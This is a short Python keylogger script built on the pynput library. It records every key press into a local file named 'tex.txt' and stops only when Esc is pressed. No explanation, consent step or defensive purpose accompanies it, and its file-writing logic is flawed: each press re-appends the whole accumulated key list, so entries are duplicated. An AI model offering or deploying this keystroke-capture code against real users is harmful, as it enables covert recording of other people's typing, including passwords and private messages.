from pynput.keyboard import Key,Listener
k=[]
def on_press(key):
    k.append(key)
    write_data(k)
    print(key)
def on_release(key):
    if key == Key.esc:
        return False

def write_data(var):
    with open("tex.txt","a") as f:
        for i in var:
            new_var = str(i).replace("'", '')
            f.write(new_var)
            f.write(" ")
 

with Listener(on_press=on_press,on_release=on_release) as l:
    l.join()
